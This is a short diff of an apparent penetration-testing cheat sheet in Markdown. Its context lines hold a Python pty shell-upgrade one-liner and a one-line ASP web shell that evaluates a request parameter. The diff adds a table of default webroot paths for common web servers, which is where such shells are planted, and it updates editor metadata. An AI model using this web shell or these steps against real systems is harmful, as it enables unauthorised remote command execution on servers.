@@ -126,8 +126,15 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 # asp
 <% eval request("cmd") %>
 ```
+
+Web Server | Default Webroot
+|--|--|
+`Apache` | /var/www/html/
+`Nginx` | /usr/local/nginx/html/
+`IIS`  | c:\inetpub\wwwroot\
+`XAMPP` | C:\xampp\htdocs\
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE4MDY2MTA4NDUsLTkyODc3MDU1NSwxOD
+eyJoaXN0b3J5IjpbLTIxMzI2MzA4NjcsLTkyODc3MDU1NSwxOD
 k3OTI4NTE2LC0xMTE4MjIwNDMzLDExMzUwNTI2ODQsLTExNzk3
 NTEyMTUsLTE5NjQ5NDM4ODgsMTQ2MjE1MTkzLDY4MTMzMTc0OS
 w5MjIyNDU1MDcsMTQxNjU5OTA3MiwtNTcyODQ4MDQxLDE1MzUy
